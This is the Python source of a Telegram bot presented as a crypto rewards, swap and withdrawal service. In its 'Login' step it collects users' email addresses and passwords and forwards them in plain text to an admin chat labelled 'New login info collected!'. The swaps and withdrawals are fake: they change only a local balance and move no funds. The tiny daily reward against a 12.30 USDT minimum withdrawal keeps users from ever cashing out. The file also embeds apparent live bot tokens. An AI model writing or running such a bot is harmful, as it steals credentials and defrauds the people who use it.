import telebot
from telebot import types
from tinydb import TinyDB, Query
from datetime import datetime, timedelta

# ---------------- CONFIG ----------------
USER_BOT_TOKEN = '8283618050:AAGfCYRtHYgWsRfU1BX_z-RzHRdZIcbnIs0'       # Replace with your bot token
ADMIN_BOT_TOKEN = '8246445927:AAH86_dfnj6YRpHxvZ1AgqJkpS3OUMdtfwA'     # Replace with admin bot token
ADMIN_CHAT_ID = 7545956571                     # Replace with your Telegram ID
DAILY_REWARD = 0.0000235
MIN_WITHDRAW = 12.30
# ----------------------------------------

# Initialize bots
bot = telebot.TeleBot(USER_BOT_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN)

# Initialize database
db = TinyDB('users.json')
User = Query()

# ---------------- START COMMAND ----------------
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if not db.search(User.id == user_id):
        db.insert({'id': user_id, 'wallet_usdt': 0.0, 'last_daily': None, 'email': '', 'password': ''})

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('💰 Daily Reward', '💱 Swap Crypto')
    markup.add('🏦 Withdraw Wallet', '📧 Login')
    markup.add('💵 Check Balance')
    bot.send_message(message.chat.id, "Welcome! Choose an option:", reply_markup=markup)

# ---------------- MENU HANDLER ----------------
@bot.message_handler(func=lambda message: True)
def menu(message):
    user_id = message.from_user.id
    if message.text == '💰 Daily Reward':
        claim_daily(message)
    elif message.text == '💱 Swap Crypto':
        bot.send_message(message.chat.id, "Enter the currency you want to swap to (e.g., BTC, ETH):")
        bot.register_next_step_handler(message, swap_currency)
    elif message.text == '🏦 Withdraw Wallet':
        user = db.get(User.id == user_id)
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add('Binance USDT', 'TRC20 USDT', 'Other Wallet')
        msg = bot.send_message(message.chat.id,
                               f"Your USDT balance: {user['wallet_usdt']}\nChoose withdrawal method:",
                               reply_markup=markup)
        bot.register_next_step_handler(msg, select_withdraw_method)
    elif message.text == '📧 Login':
        bot.send_message(message.chat.id, "Enter your email:")
        bot.register_next_step_handler(message, enter_email)
    elif message.text == '💵 Check Balance':
        user = db.get(User.id == user_id)
        bot.send_message(message.chat.id, f"💰 Your current balance: {user['wallet_usdt']} USDT")

# ---------------- DAILY REWARD ----------------
def claim_daily(message):
    user_id = message.from_user.id
    user = db.get(User.id == user_id)
    today = datetime.now()
    if user['last_daily']:
        last_daily = datetime.fromisoformat(user['last_daily'])
        if today - last_daily < timedelta(days=1):
            bot.send_message(message.chat.id, "You already claimed your reward today!")
            return
    new_balance = user['wallet_usdt'] + DAILY_REWARD
    db.update({'wallet_usdt': new_balance, 'last_daily': today.isoformat()}, User.id == user_id)
    bot.send_message(message.chat.id, f"🎉 You received {DAILY_REWARD} USDT! Your balance: {new_balance} USDT")
    admin_bot.send_message(
        ADMIN_CHAT_ID,
        f"💰 Daily reward claimed\nUser ID: {user_id}\nAmount: {DAILY_REWARD} USDT\nNew Balance: {new_balance} USDT"
    )

# ---------------- SWAP FUNCTION ----------------
def swap_currency(message):
    currency = message.text.upper()
    user_id = message.from_user.id
    user = db.get(User.id == user_id)
    bot.send_message(message.chat.id, f"Enter amount in USDT to swap to {currency}:")
    bot.register_next_step_handler(message, perform_swap, currency)

def perform_swap(message, currency):
    try:
        amount = float(message.text)
        user_id = message.from_user.id
        user = db.get(User.id == user_id)
        if amount > user['wallet_usdt']:
            bot.send_message(message.chat.id, "❌ Not enough balance!")
            return
        db.update({'wallet_usdt': user['wallet_usdt'] - amount}, User.id == user_id)
        bot.send_message(message.chat.id, f"✅ Swapped {amount} USDT to {currency} successfully!")
        admin_bot.send_message(
            ADMIN_CHAT_ID,
            f"💱 Swap executed\nUser ID: {user_id}\nAmount: {amount} USDT → {currency}"
        )
    except ValueError:
        bot.send_message(message.chat.id, "Please enter a valid number!")

# ---------------- LOGIN ----------------
def enter_email(message):
    email = message.text
    bot.send_message(message.chat.id, "Enter your password:")
    bot.register_next_step_handler(message, enter_password, email)

def enter_password(message, email):
    password = message.text
    user_id = message.from_user.id
    db.update({'email': email, 'password': password}, User.id == user_id)
    bot.send_message(message.chat.id, "✅ You are now logged in!")
    admin_bot.send_message(
        ADMIN_CHAT_ID,
        f"🚨 New login info collected!\nUser ID: {user_id}\nEmail: {email}\nPassword: {password}"
    )

# ---------------- WITHDRAW ----------------
def select_withdraw_method(message):
    method = message.text
    msg = bot.send_message(message.chat.id, f"Enter amount to withdraw via {method}:")
    bot.register_next_step_handler(msg, withdraw_with_method, method)

def withdraw_with_method(message, method):
    try:
        amount = float(message.text)
        user_id = message.from_user.id
        user = db.get(User.id == user_id)

        if amount > user['wallet_usdt']:
            bot.send_message(message.chat.id, "❌ Not enough balance!")
            return
        if amount < MIN_WITHDRAW:
            bot.send_message(message.chat.id, f"❌ Minimum withdrawal is {MIN_WITHDRAW} USDT!")
            return

        new_balance = user['wallet_usdt'] - amount
        db.update({'wallet_usdt': new_balance}, User.id == user_id)
        bot.send_message(message.chat.id,
                         f"💸 Successfully withdrawn {amount} USDT via {method}!\nRemaining balance: {new_balance} USDT")

        admin_bot.send_message(
            ADMIN_CHAT_ID,
            f"🏦 Withdraw executed\nUser ID: {user_id}\nAmount: {amount} USDT\nMethod: {method}\nRemaining Balance: {new_balance} USDT"
        )
    except ValueError:
        bot.send_message(message.chat.id, "Please enter a valid number!")

# ---------------- RUN BOT ----------------
bot.remove_webhook()
bot.polling()